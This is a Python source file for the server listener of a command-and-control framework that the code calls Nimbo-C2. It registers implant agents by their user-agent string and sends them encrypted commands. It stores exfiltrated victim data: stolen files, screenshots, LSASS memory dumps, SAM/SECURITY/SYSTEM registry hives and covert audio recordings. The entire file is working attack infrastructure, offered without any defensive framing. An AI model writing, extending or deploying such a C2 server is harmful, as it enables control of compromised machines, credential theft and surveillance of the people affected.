from server import utils

import os
import re
import json
import ntpath
import threading
import requests
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from jsonc_parser.parser import JsoncParser

agents = {}
keep_listen = True


class C2(BaseHTTPRequestHandler):

    def default_logger_sinkhole(self, *args):
        pass

    def send_default_headers_and_status_code(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()

    def update_last_checkin(self):
        agent = self.headers["user-agent"]
        agents[agent]["info"]["Last Check In"] = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    def validate_request(self):
        try:
            user_agent = self.headers["user-agent"]
        except KeyError:
            return "intruder"
        if user_agent in agents:
            return "exists"
        elif re.match(user_agent_pattern, user_agent):
            return "new"
        else:
            return "intruder"

    def parse_agent_data(self, agent_data):

        command_type = agent_data['command_type']
        agent = self.headers["user-agent"]
        file_save_strftime = "%d.%m.%Y_%H.%M.%S"
        if command_type == "download" and agent_data["data"]["is_success"] == "true":
            save_path = os.path.join(collect_folder, agent, ntpath.basename(agent_data["data"]["file_path"]))
            if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["file_content_base64"], encoding="utf-8")):
                utils.log_message(f"Downloaded remote file from agent {agent}")
                utils.log_message(f"[*] remote file: {agent_data['data']['file_path']}", print_time=False)
                utils.log_message(f"[+] saved in: {save_path}", print_time=False)

        elif command_type == "screenshot" and agent_data["data"]["is_success"] == "true":
            save_path = os.path.join(
                collect_folder, agent, "screenshot_{}.png".format(datetime.now().strftime(file_save_strftime)))
            if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["screenshot_base64"])):
                utils.log_message(f"Downloaded screenshot from agent {agent}")
                utils.log_message(f"[+] saved in: {save_path}", print_time=False)

        elif command_type == "lsass" and agent_data["data"]["is_success"] == "true":
            save_path = os.path.join(collect_folder, agent, "lsass_{}.dmp".format(datetime.now().strftime(
                file_save_strftime)))
            if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["file_content_base64"])):
                utils.log_message(f"Downloaded lsass dump from agent {agent}")
                utils.log_message(f"[+] saved in: {save_path}", print_time=False)

        elif command_type == "audio" and agent_data["data"]["is_success"] == "true":
            save_path = os.path.join(collect_folder, agent, "record_{}.wav".format(datetime.now().strftime(
                file_save_strftime)))
            if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["file_content_base64"])):
                utils.log_message(f"Downloaded audio recording from agent {agent}")
                utils.log_message(f"[+] saved in: {save_path}", print_time=False)

        elif command_type == "sam" and agent_data["data"]["is_success"] == "true":
            save_path = os.path.join(collect_folder, agent, "sam_{}".format(datetime.now().strftime(file_save_strftime)))
            sam_path = os.path.join(save_path, "sam")
            sec_path = os.path.join(save_path, "security")
            sys_path = os.path.join(save_path, "system")
            if utils.write_file(sam_path, utils.decode_base_64(agent_data["data"]["sam_base64"])) and \
                    utils.write_file(sec_path, utils.decode_base_64(agent_data["data"]["sec_base64"])) and \
                    utils.write_file(sys_path, utils.decode_base_64(agent_data["data"]["sys_base64"])):
                utils.log_message(f"Downloaded sam,security,system hives from agent {agent}")
                utils.log_message(f"[+] saved in: {save_path}", print_time=False)

        elif command_type == "collect":
            # agent exists
            try: 
                agents[agent]["info"] = agent_data["data"]
            # new agent 
            except KeyError: 
                agents[agent] = {
                    "info": agent_data["data"],
                    "pending_commands": []
                }

            utils.log_message(f"[*] Collected data from agent {agent} [command: {command_type}]")

        else:
            utils.log_message(f"Data from agent {agent} [command: {command_type}]")
            for field in agent_data["data"]:
                utils.log_message(f"[*] {field}: {agent_data['data'][field]}", print_time=False)

    def do_POST(self):
        self.log_message = self.default_logger_sinkhole
        request_classification = self.validate_request()
        if (request_classification != "intruder"):
            self.send_default_headers_and_status_code()
            content_len = int(self.headers.get('Content-Length'))
            post_body = utils.decrypt_cbc(self.rfile.read(content_len))
            agent_data = json.loads(utils.sanitize_data(post_body))
            if (request_classification == "exists" or \
                (request_classification == "new" and agent_data["command_type"] == "collect")):
                self.parse_agent_data(agent_data)
                self.update_last_checkin()
                return
        # intruder or new agent that didn't collected data as first request - Bye Bye
        self.close_connection = True

    def do_GET(self):
        self.log_message = self.default_logger_sinkhole
        requester = self.validate_request()

        if requester == "exists":
            self.send_default_headers_and_status_code()
            self.wfile.write(utils.encrypt_cbc(json.dumps(agents[self.headers["user-agent"]]["pending_commands"])))
            agents[self.headers["user-agent"]]["pending_commands"] = []
            self.update_last_checkin()
            return

        elif requester == "new":
            agents[self.headers["user-agent"]] = {
                "info": {},
                "pending_commands": []
            }
            command = """[{"command_type": "collect"}]"""
            self.send_default_headers_and_status_code()
            self.wfile.write(utils.encrypt_cbc(command))

        else:
            self.close_connection = True


def listener_start():
    if listener_status(print_status=False):
        print("[*] Listener is already up")
        return
    try:
        listener_thread.start()
    except RuntimeError:
        print("[-] Can't restart listener. please rerun Nimbo-C2")


def listener_status(print_status=True):
    is_alive = listener_thread.is_alive()
    if print_status:
        if is_alive:
            print("[*] Listener is up")
        else:
            print("[-] Listener is down")
    return is_alive


def listener_stop():
    if not listener_status(print_status=False):
        print("[*] Listener is already down")
        return
    global keep_listen
    keep_listen = False
    listener_url = f"{listener_scheme}://{listener_address}:{listener_port}"
    try:
        requests.get(listener_url)
    except requests.exceptions.ConnectionError:
        pass


def main():
    while keep_listen:
        c2.handle_request()
    c2.server_close()


# parse config
config = JsoncParser.parse_file(os.path.realpath(os.path.join(os.path.dirname(__file__), "..", "config.jsonc")))
listen_on = (config["listener"]["listen_on_address"], config["listener"]["listen_on_port"])
listener_scheme = config["listener"]["scheme"]
listener_address = config["listener"]["address"]
listener_port = config["listener"]["port"]
user_agent_pattern = r"[0-9a-f]{8}"
collect_folder = config["c2"]["general"]["collect_folder"]

# initialization
c2 = HTTPServer(listen_on, C2)
listener_thread = threading.Thread(target=main)
